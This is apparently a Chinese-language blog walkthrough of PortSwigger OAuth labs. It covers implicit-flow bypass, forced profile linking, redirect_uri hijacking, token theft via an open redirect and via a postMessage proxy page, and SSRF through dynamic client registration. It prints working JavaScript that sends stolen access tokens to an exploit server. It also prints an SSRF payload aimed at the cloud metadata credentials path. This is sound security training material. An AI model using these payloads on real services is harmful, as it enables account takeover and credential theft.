---
title: OAuth 2.0 authentication vulnerabilities
description: OAuth 2.0 authentication vulnerabilities
# last_update:
#   date: "2025-09-18T08:00:00+08:00"
last_update:
  date: "2025-11-09T08:00:00+08:00"
---

## Lab: Authentication bypass via OAuth implicit flow

| Dimension | Description                                                                                        |
| --------- | -------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/oauth#oauth-authentication                                    |
| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow |

這題我一開始很慌，因為我對 OAuth 2.0 完全不熟悉，但我還是耐著性子，照著 Lab 的敘述尋找蛛絲馬跡

```
Just complete the "Log in with social media" option while proxying traffic through Burp, then study the series of OAuth interactions in the proxy history.
```

由於 OAuth 2.0 通常會有很多頁面轉來轉去的，用 Chrome 瀏覽器，即便有 Preserve Log 還是會丟失 Response，所以這邊真心建議用 Burp Suite 的 Proxy

在看 `/authenticate` 的時候，發現不需要傳入密碼，假設後端沒有驗證 token 跟 username 的一對一關聯，那我就可以用自己的帳號產 token，再用受害者的帳號登入～

```js
fetch(`${location.origin}/authenticate`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    email: "carlos@carlos-montoya.net",
    username: "carlos",
    token: "Zo2zLEJHyQ7fJ97xmHm1TKPLX1-lSVqcKUOYPw3T5bu",
  }),
});
```

成功～這題我覺得蠻有成就感的，一開始差點急到想要看答案或是問 AI，還好後來有忍住，先嘗試自己解

## Lab: Forced OAuth profile linking

| Dimension | Description                                                                       |
| --------- | --------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/oauth#flawed-csrf-protection                 |
| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking |

這題需要使用 Burp Suite 的 Intercept，因為綁定 Social Media 到 Client App 只有一次機會

看到 https://0a8e007d049cf42e80b012da009800ee.web-security-academy.net/oauth-linking?code=RhrOkIHwCimQsT0dm8U6LpbM-nKCeQH0zt9KBDosfU- 的時候，請把這個 Request Drop 掉

之後在 exploit-server 構造

```
HTTP/1.1 302 Moved Permanently
Content-Type: text/html; charset=utf-8
Location: https://0a8e007d049cf42e80b012da009800ee.web-security-academy.net/oauth-linking?code=RhrOkIHwCimQsT0dm8U6LpbM-nKCeQH0zt9KBDosfU-
```

受害者在 Client App 登入的情況點擊連結，就會把攻擊者的 Social Media 跟受害者的 Clieny App 帳號綁定

## Lab: OAuth account hijacking via redirect_uri

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens |
| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri  |

在 exploit-server 構造

```
HTTP/1.1 302 Moved Permanently
Content-Type: text/html; charset=utf-8
Location: https://oauth-0a04008a03e7f89981d3ece602ad0020.oauth-server.net/auth?client_id=jrmnw2fbwsqv486hokfhp&redirect_uri=https://exploit-0a29002c03a3f832817ded3c01ea0003.exploit-server.net&response_type=code&scope=openid%20profile%20email
```

並且點選 "Deliver exploit to victim"，之後點選 "Access log"，就可以看到 `/?code=ADzZw2MustwUWOTkQRH8HQxFst6AR3yh9Lq46FhEWuj`

瀏覽器直接訪問 https://0a3c004103aff8dd8163eeb00095006c.web-security-academy.net/oauth-callback?code=ADzZw2MustwUWOTkQRH8HQxFst6AR3yh9Lq46FhEWuj ，就可以成功登入受害者 (admin) 的帳密～

## Lab: Stealing OAuth access tokens via an open redirect

| Dimension | Description                                                                                            |
| --------- | ------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens               |
| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect |

這題要先找出 Blog Website 的 Open Redirect，再導到 exploit-server

嘗試 https://oauth-0a8200a403693a1a89de904f02b20045.oauth-server.net/auth?client_id=t0qdkhhz8xmcq5t0gaq68&redirect_uri=https://www.google.com&response_type=token&nonce=-915712611&scope=openid%20profile%20email ，看到以下錯誤訊息

```
error: redirect_uri_mismatch
error_description: redirect_uri did not match any of the client's registered redirect_uris
```

在 "Next post" 找到 Open Redirect

https://0a75003a03dc3add89cf92bb0088004d.web-security-academy.net/post/next?path=https://www.google.com => https://www.google.com

在 exploit-server 構造

```
HTTP/1.1 302 Moved Permanently
Content-Type: text/html; charset=utf-8
Location: https://oauth-0a8200a403693a1a89de904f02b20045.oauth-server.net/auth?client_id=t0qdkhhz8xmcq5t0gaq68&redirect_uri=https://0a75003a03dc3add89cf92bb0088004d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aa5006203513a5189699125011500ed.exploit-server.net&response_type=token&nonce=156954374&scope=openid%20profile%20email
```

可惜沒辦法看到 querystring 跟 hash

```
10.0.3.58       2025-09-18 01:37:25 +0000 "GET /exploit/ HTTP/1.1" 302 "user-agent: Mozilla/5.0 (Victim)"
10.0.3.58       2025-09-18 01:37:26 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
10.0.3.58       2025-09-18 01:37:26 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
```

我需要知道導回 /oauth-callback 時，querystring 跟 hash 的順序，實際點選上方的 Location 用我的帳密註冊後，我發現會導到 https://exploit-0aa5006203513a5189699125011500ed.exploit-server.net/#access_token=X1urGiEyGjetOUsmGaG8BBBsfiUu13ymTsQ7nzDTiIn&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email

只是 # 後面的東西不會印在 Access log，我們假定 redirect_uri 後面會塞 `#access_token=X1urGiEyGjetOUsmGaG8BBBsfiUu13ymTsQ7nzDTiIn&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email`，那整段就是

https://0a75003a03dc3add89cf92bb0088004d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aa5006203513a5189699125011500ed.exploit-server.net#access_token=X1urGiEyGjetOUsmGaG8BBBsfiUu13ymTsQ7nzDTiIn&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email

由於 exploit-server 只能設定一組 path，所以我同時要讓受害者

1. 先轉到 oauth
2. Open Redirect 回來 `/exploit`
3. 把 `#` 後面的內容想辦法塞到 Access log

所以需要一個 flag 來儲存 `isOAuthed`

```html
<script>
  const isOAuthed = localStorage.getItem("isOAuthed");
  if (!isOAuthed) {
    localStorage.setItem("isOAuthed", "1");
    location.assign(
      `https://oauth-0a8200a403693a1a89de904f02b20045.oauth-server.net/auth?client_id=t0qdkhhz8xmcq5t0gaq68&redirect_uri=https://0a75003a03dc3add89cf92bb0088004d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aa5006203513a5189699125011500ed.exploit-server.net/exploit&response_type=token&nonce=156954374&scope=openid%20profile%20email`,
    );
  } else {
    fetch(
      `https://exploit-0aa5006203513a5189699125011500ed.exploit-server.net/?url=${encodeURIComponent(location.href)}`,
    );
  }
</script>
```

成功在 Access log 提取到完整的 access_token

```
10.0.3.58       2025-09-18 02:29:21 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
10.0.3.58       2025-09-18 02:29:22 +0000 "GET /exploit HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
10.0.3.58       2025-09-18 02:29:22 +0000 "GET /?url=https%3A%2F%2Fexploit-0aa5006203513a5189699125011500ed.exploit-server.net%2Fexploit%23access_token%3DCqK9rJz3bJS0R4n8NaAwA8d71XOwrqf0sSgoYwo6Lwk%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
```

decode 之後

```js
decodeURIComponent(
  `https%3A%2F%2Fexploit-0aa5006203513a5189699125011500ed.exploit-server.net%2Fexploit%23access_token%3DCqK9rJz3bJS0R4n8NaAwA8d71XOwrqf0sSgoYwo6Lwk%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email`,
);
// https://exploit-0aa5006203513a5189699125011500ed.exploit-server.net/exploit#access_token=CqK9rJz3bJS0R4n8NaAwA8d71XOwrqf0sSgoYwo6Lwk&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

看一下 https://0a75003a03dc3add89cf92bb0088004d.web-security-academy.net/oauth-callback 會做什麼事情

```html
<script>
  const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
  const token = urlSearchParams.get("access_token");
  fetch("https://oauth-0a8200a403693a1a89de904f02b20045.oauth-server.net/me", {
    method: "GET",
    headers: {
      Authorization: "Bearer " + token,
      "Content-Type": "application/json",
    },
  })
    .then((r) => r.json())
    .then((j) =>
      fetch("/authenticate", {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: j.email,
          username: j.sub,
          token: token,
        }),
      }).then((r) => (document.location = "/")),
    );
</script>
```

看起來我直接用瀏覽器訪問 https://0a75003a03dc3add89cf92bb0088004d.web-security-academy.net/oauth-callback#access_token=CqK9rJz3bJS0R4n8NaAwA8d71XOwrqf0sSgoYwo6Lwk 就好

進到 My Account 頁面後

```
Your username is: administrator
Your email is: administrator@normal-user.net
Your API Key is: [hidden]
```

用 `[hidden]` 跟 `hidden` 提交都錯，回到 Burp Suite HTTP History，看到 https://oauth-0a8200a403693a1a89de904f02b20045.oauth-server.net/me

```json
{
  "sub": "administrator",
  "apikey": "iftd1l1jDBEWfGrrFuQa4u4gVgH3h7dC",
  "name": "Administrator",
  "email": "administrator@normal-user.net",
  "email_verified": true
}
```

這題真的有難度～

1. 要找到 Open Redirect
2. 要發現 `location.hash` 不會顯示在 Access Log，並且找到 alternative solution
3. 成功登入 admin 帳號後，還要尋找 apiKey 是在哪個 API Endpoint 回傳的

## Lab: Stealing OAuth access tokens via a proxy page

| Dimension | Description                                                                                        |
| --------- | -------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens           |
| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page |

我們先從這裡開始

```
To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account.
```

在留言板看到一個很有趣的 HTML

```html
<iframe
  onload='this.height = this.contentWindow.document.body.scrollHeight + "px"'
  width="100%"
  frameborder="0"
  src="/post/comment/comment-form#postId=10"
  height="636px"
></iframe>

<script>
  window.addEventListener(
    "message",
    function (e) {
      if (e.data.type === "oncomment") {
        e.data.content["csrf"] = "SLlXF7l8RVN3YJ3mZAWDn7vFq1z4DXJU";
        const body = decodeURIComponent(
          new URLSearchParams(e.data.content).toString(),
        );
        fetch("/post/comment", {
          method: "POST",
          body: body,
        }).then((r) => window.location.reload());
      }
    },
    false,
  );
</script>
```

iframe 內部

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      parent.postMessage({ type: "onload", data: window.location.href }, "*");
      function submitForm(form, ev) {
        ev.preventDefault();
        const formData = new FormData(document.getElementById("comment-form"));
        const hashParams = new URLSearchParams(window.location.hash.substr(1));
        const o = {};
        formData.forEach((v, k) => (o[k] = v));
        hashParams.forEach((v, k) => (o[k] = v));
        parent.postMessage({ type: "oncomment", content: o }, "*");
        form.reset();
      }
    </script>
    <hr />
    <section class="add-comment">
      <h2>Leave a comment</h2>
      <form id="comment-form" onsubmit="submitForm(this, event)">
        <label>Comment:</label>
        <textarea required rows="12" cols="300" name="comment"></textarea>
        <label>Name:</label>
        <input required type="text" name="name" />
        <label>Email:</label>
        <input required type="email" name="email" />
        <label>Website:</label>
        <input pattern="(http:|https:).+" type="text" name="website" />
        <button class="button" type="submit">Post Comment</button>
      </form>
    </section>
  </body>
</html>
```

重點應該在這裡，有機會把整個 URL 偷走，這是題目故意設計的 vulnerable code

```js
parent.postMessage({ type: "onload", data: window.location.href }, "*");
```

先確定 redirect_uri 可以設定 `/post/comment/comment-form`，https://oauth-0a3b00690304f08a80f083e302720086.oauth-server.net/auth?client_id=zny8vh0mgwfqi6zvjzepp&redirect_uri=https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=584928898&scope=openid%20profile%20email

在 exploit-server 構造

```html
<script>
  addEventListener("message", function (e) {
    const url = e.data.data;
    fetch(
      `https://exploit-0a950082032af01d806f8451015800a8.exploit-server.net/?url=${encodeURIComponent(url)}`,
    );
  });
</script>
<iframe
  src="https://oauth-0a3b00690304f08a80f083e302720086.oauth-server.net/auth?client_id=zny8vh0mgwfqi6zvjzepp&redirect_uri=https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=584928898&scope=openid%20profile%20email"
></iframe>
```

之後就可以在 Access log 看到

```
10.0.3.240      2025-09-18 08:29:38 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
10.0.3.240      2025-09-18 08:29:38 +0000 "GET /?url=https%3A%2F%2F0a78008d03ddf00b80008592005b0043.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3D7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim)"
```

decode 之後

```js
decodeURIComponent(
  `https%3A%2F%2F0a78008d03ddf00b80008592005b0043.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3D7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email`,
);
// https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/post/comment/comment-form#access_token=7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

接下來就跟上一題一模一樣的解法，瀏覽器訪問 https://0a78008d03ddf00b80008592005b0043.web-security-academy.net/oauth-callback#access_token=7LodCFMonOVHInNo_WDKd2n31cL1mRWaHzOC0ncLzIY，然後到 Burp Suite 看 HTTP History

https://oauth-0a3b00690304f08a80f083e302720086.oauth-server.net/me

```json
{
  "sub": "administrator",
  "apikey": "d9c2oN6ohzINFbyFxPvLx6mAn3wKxZtG",
  "name": "Administrator",
  "email": "administrator@normal-user.net",
  "email_verified": true
}
```

## Unprotected dynamic client registration

<!-- last_update:
  date: "2025-11-09T08:00:00+08:00" -->

https://portswigger.net/web-security/oauth/openid#unprotected-dynamic-client-registration

```
The name of this endpoint is usually provided in the configuration file and documentation.
```

通常會在 OAuth Provider 的 `/.well-known/openid-configuration`

## Lab: SSRF via OpenID dynamic client registration

<!-- last_update:
  date: "2025-11-09T08:00:00+08:00" -->

| Dimension | Description                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/oauth/openid#unprotected-dynamic-client-registration               |
| Lab       | https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration |

P.S. 這題雖然有說需要 Burp Collaborator，但實際上不用，所以免費仔也可以解這題

訪問 `/.well-known/openid-configuration`，回傳

```json
{
  "authorization_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/auth",
  "claims_parameter_supported": false,
  "claims_supported": [
    "sub",
    "name",
    "email",
    "email_verified",
    "sid",
    "auth_time",
    "iss"
  ],
  "code_challenge_methods_supported": ["S256"],
  "end_session_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/session/end",
  "grant_types_supported": ["authorization_code", "refresh_token"],
  "id_token_signing_alg_values_supported": [
    "HS256",
    "ES256",
    "EdDSA",
    "PS256",
    "RS256"
  ],
  "issuer": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net",
  "jwks_uri": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/jwks",
  "registration_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/reg",
  "response_modes_supported": ["form_post", "fragment", "query"],
  "response_types_supported": ["code"],
  "scopes_supported": ["openid", "offline_access", "profile", "email"],
  "subject_types_supported": ["public"],
  "token_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "token_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "token_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/token",
  "request_object_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "request_parameter_supported": false,
  "request_uri_parameter_supported": true,
  "require_request_uri_registration": true,
  "userinfo_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/me",
  "userinfo_signing_alg_values_supported": [
    "HS256",
    "ES256",
    "EdDSA",
    "PS256",
    "RS256"
  ],
  "introspection_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/token/introspection",
  "introspection_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "introspection_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "revocation_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/token/revocation",
  "revocation_endpoint_auth_methods_supported": [
    "none",
    "client_secret_basic",
    "client_secret_jwt",
    "client_secret_post",
    "private_key_jwt"
  ],
  "revocation_endpoint_auth_signing_alg_values_supported": [
    "HS256",
    "RS256",
    "PS256",
    "ES256",
    "EdDSA"
  ],
  "claim_types_supported": ["normal"]
}
```

找到 registration_endpoint = `https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/reg`

嘗試

```json
{
  "redirect_uris": [
    "https://0ae8009904e242b5801b0321005c00bb.web-security-academy.net/oauth/callback"
  ],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

回傳

```json
{
  "application_type": "web",
  "grant_types": ["authorization_code"],
  "id_token_signed_response_alg": "RS256",
  "post_logout_redirect_uris": [],
  "require_auth_time": false,
  "response_types": ["code"],
  "subject_type": "public",
  "token_endpoint_auth_method": "client_secret_basic",
  "introspection_endpoint_auth_method": "client_secret_basic",
  "revocation_endpoint_auth_method": "client_secret_basic",
  "require_signed_request_object": false,
  "request_uris": [],
  "client_id_issued_at": 1762681363,
  "client_id": "BlAFeJy0mfnjJ8FQrkL8c",
  "client_secret_expires_at": 0,
  "client_secret": "fnuNqzAag-cVrS4A9rE4mXwF7bSnxyRXYrW6-SvuQpqEp_uf4DqBvUBCzcZ6YwNI9vzSwEqi7jB7rqKscKdQHA",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
  "redirect_uris": [
    "https://0ae8009904e242b5801b0321005c00bb.web-security-academy.net/oauth/callback"
  ],
  "registration_client_uri": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/reg/BlAFeJy0mfnjJ8FQrkL8c",
  "registration_access_token": "hc9PcrcDZGucUC9c38xidpWMtRTRTLkp8DzSiaXjACz"
}
```

之後瀏覽器訪問 /auth?client_id=BlAFeJy0mfnjJ8FQrkL8c&redirect_uri=https://0ae8009904e242b5801b0321005c00bb.web-security-academy.net/oauth/callback&response_type=code&scope=openid%20profile%20email，照著登入流程走，帳密輸入 `wiener:peter`，到 consent 頁面時，就會顯示 logo_uri（應該會破圖），右鍵 "在新分頁中開啟圖片"，就可以看到

```json
{
  "Code": "Success",
  "LastUpdated": "2025-11-09T09:18:29.854382424Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "XSJVLpKcjqPS2Qjs1uIM",
  "SecretAccessKey": "2rP5YSGbYLJqgvTqxshFZneHqT4G6ABdkPdxx9Fd",
  "Token": "INOn8DPr4qD39ClqfM6rSx6Pd4TqKwmhVj1TQJAVvtOCqhLObqq7vbY1hq7Cp7THenQ0nM5ytvpYvUlRvTRuBR55p8F4b7Jg263ab6UdbG34ebObN08AMA2yxhL8ndZOgkHtch43kIojkdNlmmwoyJ1MXE4dzH692yTNaKr6viTUs1ICyi5jiAntWHDxLXwRR8jqdihXu94V5blMsBv0ll9GBc2qW2hDpMYYc0jYtHzBbna9DNXZBvtieIs58nhK",
  "Expiration": "2031-11-08T09:18:29.854382424Z"
}
```

把 SecretAccessKey 的值 SubmitSolution 即可通關～

## 小結

在解 Lab 的過程，我才知道 OAuth 原來有 RFC，感覺之後要找時間來讀一下，至少把基礎的架構搞懂

## 參考資料

- https://portswigger.net/web-security/oauth
